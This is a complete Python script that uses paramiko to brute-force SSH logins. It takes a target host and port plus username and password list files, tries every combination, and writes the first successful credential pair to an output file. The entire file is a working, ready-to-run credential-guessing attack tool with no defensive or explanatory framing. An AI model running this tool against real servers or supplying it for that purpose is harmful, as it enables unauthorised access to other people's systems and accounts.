import paramiko
import argparse
import socket
import os
import time


def brute_force_ssh(host, p, user, passwd):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f"Testing {user}:{passwd}")
        client.connect(hostname=host, port=p, username=user, password=passwd, timeout=3)
    except socket.error as error:
        print("[!] Socket error", error)
        return False
    except socket.timeout:
        print("[!] Timeout error")
        return False
    except paramiko.AuthenticationException as exception:
        print("[!] Authentication exception", exception)
        return False
    except paramiko.SSHException:
        print("[?] Try again")
        time.sleep(30)
        return brute_force_ssh(host, p, user, passwd)
    else:
        print(f"[+] Successfully logged in with {user}:{passwd}")
        return True

def create_success_file(filename, user, password):
    with open(filename, "a") as f:
        f.write(f"{user}:{password}")

def arg_pars():
    parser = argparse.ArgumentParser(description="Brute force SSH programm")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Target hostname or IP address")
    parser.add_argument("-p", "--ports", dest="target_port", required=True, help="Target SSH port")
    parser.add_argument("-o", "--output", dest="output_file", required=True, help="File to save successful logins")   
    parser.add_argument("user_file", help="File containing a list of usernames")
    parser.add_argument("pass_file", help="File containing a list of passwords")
    return parser.parse_args()

def exist_file(file_path):
    if not os.path.isfile(file_path):
        print(f"[!] File not found: {file_path}")
        exit(1)

args = arg_pars()

exist_file(args.user_file)
exist_file(args.pass_file)
port=int(args.target_port)
with open(args.user_file, "r") as f:
    users = f.read().splitlines()
with open(args.pass_file, "r") as f:
    passwords = f.read().splitlines()

attempted_count = 0
for user in users:
    for password in passwords:
        attempted_count += 1
        print(f"[#] attempt {attempted_count}: {user}:{password}")
        if brute_force_ssh(args.target_ip, port, user, password) == True:
            create_success_file(args.output_file, user, password)
            exit()
        else:
            print(f"[-] failed attempt {attempted_count} for {user}:{password}")